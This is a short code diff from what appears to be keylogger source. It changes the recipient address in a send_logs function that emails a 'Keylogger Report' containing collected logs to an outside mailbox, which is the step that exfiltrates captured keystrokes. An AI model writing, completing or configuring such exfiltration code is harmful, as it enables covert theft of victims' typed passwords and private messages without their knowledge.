@@ -112,7 +112,7 @@ def send_logs(content):
     full_body = summary + body
     
     success = sender.send(
-        recipient="hcc.sso.edu.tw@gmail.com",
+        recipient="dxjh112109@dxjh.hcc.edu.tw",
         subject=f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
         body=full_body
     )
